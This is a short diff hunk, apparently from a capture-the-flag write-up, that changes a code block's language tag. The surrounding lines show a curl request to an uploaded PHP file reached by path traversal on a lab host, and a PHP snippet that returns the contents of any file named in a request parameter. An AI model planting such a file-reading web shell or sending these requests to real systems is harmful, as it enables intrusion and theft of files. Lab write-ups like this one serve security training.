@@ -341,7 +341,8 @@ root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --da
 
 I’ll add some code to my PHP that will run DB queries:
 
-```sploit = <?php
+```bash
+sploit = <?php
 if (isset($_REQUEST['file'])) { 
     echo file_get_contents($_REQUEST['file']);
 } 
